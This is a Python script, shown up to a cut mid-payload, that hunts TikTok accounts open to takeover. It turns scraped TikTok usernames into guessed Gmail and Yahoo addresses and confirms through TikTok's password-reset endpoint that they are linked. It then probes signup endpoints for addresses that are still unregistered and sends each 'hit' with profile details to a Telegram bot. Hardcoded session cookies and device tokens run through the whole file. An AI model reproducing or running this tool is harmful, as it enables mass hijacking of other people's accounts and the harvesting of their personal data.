import requests
import json
import random
import threading
from user_agent import generate_user_agent
import time
import os




a = 0
r =0
rr=0
j=0
rrr=0
aa=0
aaa=0
za=0
aaaa=0
p = 0
m =0
n = 0
s = 0
Y=0
y=0
yy=0
b = 0




os.system('cls' if os.name=='nt'else'clear')

url = 'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=7151371875721430533&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=1024&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'

he3 = {
    'user-agent': generate_user_agent(),
}
co = requests.get('https://www.tiktok.com/',headers=he3)
pr = co.cookies.get_dict()
ttwid = pr['ttwid']
co1 = requests.get('https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
pr = co1.cookies.get_dict()
msToken = pr['msToken']

        
took =input('Enter Your Token Bot : ')
idddd =input('Enter Your ID : ')

#################


def zaidk():
    


    
    global a,m,n,a,p,aaa,aaaa,aa,rr,rrr,r,j,Y,yy,y,idddd,took
    while True:
        user='qwervbnm'
        num='456789'
        rng=int("".join(random.choice(num)for i in range(1)))
        usery=str("".join(random.choice(user)for i in range(rng)))
        
        
        url = f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=7151371875721430533&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=1024&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'
        he = {
        'accept': '*/*',
        'cookie':
        f'ttwid={ttwid};msToken={msToken}',
        'referer': 'https://www.tiktok.com/',
        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }
        try:
            
            rr = requests.get(url,headers=he).json()
        except requests.exceptions.ConnectionError as errror:
            continue
        
        try:
            
            
            email = len(rr['user_list'][0]['user_info']['unique_id'])
            for i in range(0,email):
                
                user1 = rr['user_list'][i]['user_info']['unique_id']
                #print(f'[=] - user ; {user1}')
                lm = (f'{user1}@gmail.com')
                lg = (f'{user1}@yahoo.com') 
                if ('@gmail.com') in lm:
        
                    url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
                    headers = {
                        'host':'api2-19-h2.musical.ly',
                        'connection':'keep-alive',
                        'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
                        'accept-Encoding':'gzip',
                            'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
                            'connection': 'close'}
                    data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={lm}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
                    try:
                        ree = requests.post(url,headers=headers,data=data).text
                    except requests.exceptions.ConnectionError as error:
                        continue
                    
                    if ('"Sent successfully"') in ree:
                        url0 = f'https://android.clients.google.com/setup/checkavail'
                        headers = {
                        'Content-Length':'98',
                        'Content-Type':'text/plain; charset=UTF-8',
                        'Host':'android.clients.google.com',
                        'Connection':'Keep-Alive',
                        'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
                        data= json.dumps({
                        'username':lm,
                        'version':'3',
                        'firstName':'AbaLahb',
                        'lastName':'AbuJahl'})
                        try:
                            res=requests.post(url0,headers=headers,data=data)
                        except requests.exceptions.ConnectionError as error:
                            continue
                        if res.json()['status'] =='USERNAME_UNAVAILABLE':
                            p+=1
                            os.system('cls' if os.name =='nt'else'clear')
                                        
                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')

                        elif res.json()['status'] =='SUCCESS': 
                
                            a+=1
                            os.system('cls' if os.name =='nt'else'clear')
                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                            us11 = (user1)
                            
                            ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                            ik = requests.get(ui).text
                            if ('اليوزر غير موجود') in ik:
                                p+=1
                            else:
                        
                                nam = ik.split('name :')[1]
                                name = nam.split('follower')[0]
                                fo = nam.split('follower :')[1]
                                fol = fo.split('following :')[0]
                                fols = ik.split('following :')[1]
                                fols1 = fols.split(' heart :')[0]
                                lik = ik.split('heart :')[1]
                                like = lik.split('bio :')[0]
                                bi = ik.split('bio :')[1]
                                bio = bi.split('id :')[0]
                                id1 = ik.split('id :')[1]
                                id = id1.split('posts : ')[0]
                                vieod= ik.split('posts :')[1]
                        
                            #re2 = requests.get(url2,headers=head2).json()
                                j+=1
                                req = f'HIT : {j}\nName : {name}\nEmail : {lm}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
                                tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                                ru= requests.post(tlg)
                                
                            
                    elif ('"Bind device by email failed"') in ree:
                        m+=1
                        os.system('cls' if os.name =='nt'else'clear')
                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                    else:
                        m+=1
                        os.system('cls' if os.name =='nt'else'clear')
                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                        
                if ('@yahoo.com') in lg:
                    url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
                    headers = {
            'host':'api2-19-h2.musical.ly',
            'connection':'keep-alive',
            'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
            'accept-Encoding':'gzip',
                'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
                'connection': 'close'}
                    data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={lg}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
                    try:
                        ree = requests.post(url,headers=headers,data=data).text
                    except requests.exceptions.ConnectionError as error:
                        continue
        
                    if ('"Sent successfully"') in ree:
                        url = 'https://login.yahoo.com/account/module/create?validateField=userId'
                        nm =(user1)
                        h ={
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-length': '8208',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'A3=d=AQABBLDiSmMCENghLsb2Y9NlQbhTjw-wXoEFEgEBAQE0TGNUYwAAAAAA_eMAAA&S=AQAAAkVOnU2c9QkWKFMiS5nYYIA; A1=d=AQABBLDiSmMCENghLsb2Y9NlQbhTjw-wXoEFEgEBAQE0TGNUYwAAAAAA_eMAAA&S=AQAAAkVOnU2c9QkWKFMiS5nYYIA; A1S=d=AQABBLDiSmMCENghLsb2Y9NlQbhTjw-wXoEFEgEBAQE0TGNUYwAAAAAA_eMAAA&S=AQAAAkVOnU2c9QkWKFMiS5nYYIA&j=WORLD; GUCS=AQIAIZQh; AS=v=1&s=ppDc2opX&d=A637204d0|w9cpyfj.2Sr5b1TRvC4uEyPYfZrj4ipbNW8fWl3ZdZ8NLAkFj4UjZ5VBn4Nde.x45NI9tk0HSLCFIu3BG5qEPF6SpxdxgphnVcdRC0DqW2s16unLF6iIcH3GUvTwQK2FzLeMEGYM1qm8nD8Snac.8vSlzpvW0LXs4SsrgmhCLfW0THbqF0WE9fPVP.3rY3JT4LwsH5a.PoLptCJT4fcagaqyM25L1.nZXweHQiF_de3WcnFThNaE.rl4NTfQ7od0WGh4c3KxFliS.p0O.RYa40XZG7t85JhR3jqdTJyGiqUfb4TGpPiCmP5TfOjbbqQJ980gFKLeyMY1iB3f8I4yZUAwp0fQOJyVWh5Y2utUXVx2RC9CYh2QGqLUbv.TZQNpIYaxQHAmumZGl4EMtQscatyUNIk6RrmwRYbCj4kNrubbc6HhqsdB73rx3pmaAmdivJoknPqCyhBTJQ_wJoAQ2vi0Di7z2HpV8XsOSSGSy.e5wX_6r59Gw9OcazwH1Q.A.3av0y8GHLQOrpTGXLWpQvaXI9G0.RdF3zbNA1cZjY9uu2klH8cB2p8I7Z9y5W0z8JHYPqWDPzVMrK8qXNA36qiPgBB9sfnIaWvhoiFWizm0gjNhaYOpL.DM6LRvLLw4K21ONMp23DS7hwBqtbsfMEKWyvXljJ6_flJKmFOECfMt4C6OgCEjM5BJ2SPRjbdzn98A3VsrvNiVpWSeDL1rIKSk1i6T7Csaq8DLUOsM4FhmBQlSGEK4_ISuzn7MlHHj7xuPrdYelQLKzL61kL4g8Q.Qlw--~A|B637204e0|zwi8TJP.2SqX9X9zBJfjrtbgLngm6re3GdK2jWkayqjTJsfrinvNum33QWY36IIgdRODBEvTSwONo8ZErp1GZRHqGfxVLA5r_OsKO7vM0k6bAX1QMEw3IzEourk3QgtNHEFIXzoaQS_SycF7JxKQQfBqDECTX8OWGfbCF.UQ1VVvdy7PNsuJfHxja7m.lms0qOc_AU.wv1YSg11QEHX5BilsLV_Q2V3WOZSfyTxP56YBF4AoINSoOqgpgEi5gUbhID.6s2KccPVum3mG1xqoA6quXa8cgpSUUPdul0leqQaHblIvzPHSuW6qJ1YD.NM5tqrNdBMJNYTGYnzqqNdc3OrRrsHkcxd04XMQoGrqEDPbDzyJZJBvh7w_Txq2_1PGS1YxZ.gjKCFpyT_hAL5x7S9i4ZmVt9iy6nUVZiA1kXL2uhegLrvdUz3zNzHiFbGnPrHxTKWYW7x3gvH068WfCFZb3HvpiD7It9jiFKeCFKfVXKiATQkDHC38pdTYfJnfeF6kb1bNIYlGc2CNOuI2IhQkzlCOa7U8qe1gH5CSUxtcz8NZAqHpTinPOwFhsDadiO61J4Im4lJEInLlNJTYVGDrO62uw5rQWrBuZ6TnQ7Y3zkF8M8KPjxfsvah8PWEBUKW_4EfWZk19.SnYvUBNwLimH51u4gXX2JDMRVT9aZEYLhNHnmtTA.LKLRrMLPK9HnsaW9.200K1QI3YUg_AE_Q84xEJRbQ7T7gFI5sTonAdcp.0NHnfPzlVFUXzDMqWAHVC7KysGM7moOP2eFMv2xY-~A|C63720538|iQD3sfD.2Sre4Wod6TSVCaTM6TNHytx2Z65WdJWNShchdjUlSDKqY6c5dAYwK2jtYCKNQjrhdUR8B5SZJB41cIXdyhHuMTr9YrOu2cTr7HluDOt.gB3P8_tBf.Gb2GrKyMBiddlEKqOpo5RRpaJ91ehA7o2NCzAQVT4kR_0WhA67zxV3FA2CTsNmGkjXopBSUEvvh3rBepYurqAyJDdEQcaHtAEbtG6hvCChE2kA0UiiG53fkrsTctWf5H8fhQZrfiHNomDxEqyo7_oWqgY7uu0V6asZ9IL9nfkfe9n6c7dTXfp6_He1y0SrXurTQcRfSjMXoLDH1W_cZF.kZUWLYlNKXdY37YHUsFtKFTkFE1xrDM2tkD2Bzq.ymPt0QC0z_esqqK7HM7HDOz8Rd6nJ6bh1MRldVi7L3XN31N8X4YqHKgU3fETpkQh_Buh6oB6qPTvs0IJrrIbElUlLrl.BaW2wtP6fwduroM.xlFXipmcfXlzsP8Up1_Knt.PW3VQcCmgDKNFIItOpj3sjTTMouQqsWihLJ6QFVZzOI6JAlTet7cMxaXlpSbzo7xSL2EpRryKir0LHZjie.tDvdScsaPvBVGFOPiRfqJCZPkQvHxywcjfaK5q3mZ_tHLTFNfZElUVwBgZ4ku67BjMNY8blZRD79o.YW8r1CsSJUcChioec8s4siojNko9NwB.s0FJvTFk3fT7h1k_nj0nhvtBsSSpa33fGafNYZWSKOjVkcvEr.yLLWvKZv6MSXq7m7lIOKzqZYhVli9cXWS2M94pIyP1Fg7Gg4KLHiliHu8D4CAVF~A',
                            'origin': 'https://login.yahoo.com',
                            'referer': 'https://login.yahoo.com/account/create?intl=xa&lang=en-US&src=ym&specId=yidregsimplified&done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguce_referrer%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%26guce_referrer_sig%3DAQAAAKb6LLcPpwPYCmhyPlPl9h6XBv53DSPptpgdTgF-IY-ODPM8X3-BaLqdIOtalXvp1wSNY0iVGtuBEq7Kom_VjLLfY9ayzRnfd1_UBioS1k0Me4vJPnmy0QPtZ8KjDR0Gsp_LILlkMnm-_s6ihs6TbSPVJ9Pbuoz9NbONwj80qvx6',
                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                            'x-requested-with': 'XMLHttpRequest'
            }
                        d = {
                            '{"language"':'"en-US","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1600","h":"900"},"availableResolution":{"w":"860","h":"1600"},"ts":{"serve":1668330427973,"render":1668330428925}}',
                            'specId': 'yidregsimplified',
                            'cacheStored': '',
                            'crumb': 'H3WBRpXvAXv',
                            'acrumb': 'ppDc2opX',
                            'done': 'https://mail.yahoo.com/?guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAKb6LLcPpwPYCmhyPlPl9h6XBv53DSPptpgdTgF-IY-ODPM8X3-BaLqdIOtalXvp1wSNY0iVGtuBEq7Kom_VjLLfY9ayzRnfd1_UBioS1k0Me4vJPnmy0QPtZ8KjDR0Gsp_LILlkMnm-_s6ihs6TbSPVJ9Pbuoz9NbONwj80qvx6',
                            'googleIdToken': '',
                            'authCode': '',
                            'attrSetIndex': '0',
                            'specData': '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